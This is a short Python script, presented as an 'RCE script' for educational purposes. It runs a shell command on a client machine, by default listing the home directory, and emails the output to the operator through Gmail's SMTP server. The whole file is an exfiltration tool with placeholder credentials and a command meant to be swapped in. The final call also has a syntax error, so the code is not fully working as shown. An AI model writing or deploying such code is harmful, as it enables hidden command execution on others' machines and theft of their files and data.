"""" 
 This Script executes commands on a client and sends the results via mail 
 Still working on this script ^_^
 For Educational Purposes only
""""
print("-"*30)
print("RCE script BY Mathew Alab\ntwitter : ayokunle_al")
print("-"*30)

import subprocess , smtplib 

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()
       

command = "ls -alh ~" #change this to your own command 

result = subprocess.check_output(command,shell = True)

#change this
send_mail"email@gmail.com","password",result)

